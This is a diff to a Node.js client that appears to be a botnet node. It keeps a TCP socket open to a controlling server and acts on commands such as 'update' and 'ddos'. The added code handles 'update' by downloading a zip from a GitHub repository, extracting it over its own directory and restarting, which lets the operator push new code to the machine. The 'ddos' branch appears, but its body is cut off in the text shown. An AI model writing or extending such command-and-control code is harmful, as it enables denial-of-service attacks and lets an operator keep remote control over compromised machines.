@@ -1,10 +1,21 @@
-module.exports.run = (function (){
+module.exports.run = (async function (){
     const rawHttp = require('./Scripts/rawHttp')
     var net = require('net');
     var client = new net.Socket();
     const mainServer = require('./index')
     const ServerName = "Aqua";
     const request = require('request')
+    const fs = require('fs')
+    const unzipper = require('unzipper')
+
+
+    function sleep(ms) {
+        return new Promise((resolve) => {
+          setTimeout(resolve, ms);
+        });
+      }   
+    
+
 
     try {
         client.setKeepAlive(true, 500);
@@ -14,15 +25,20 @@ module.exports.run = (function (){
         });
 
         
-        client.on('data', function(data) {
+        client.on('data', async function(data) {
             data = data.toString();
             if(data.split('|')[0] === undefined) return;
             data = data.split('|');
             let option = data[0];
             if(option === "update")
             {
-                let UpdateLink = data[1];
-                
+                console.log("updating")
+                await request("https://codeload.github.com/tewni-svg/Client/zip/main").pipe(fs.createWriteStream('../main.zip'))
+                await sleep(10000);
+                await fs.createReadStream('../main.zip')
+                .pipe(unzipper.Extract({ path: '../' }));
+                await sleep(10000);
+                process.exit(1);
             }
             if(option === "ddos")
             {
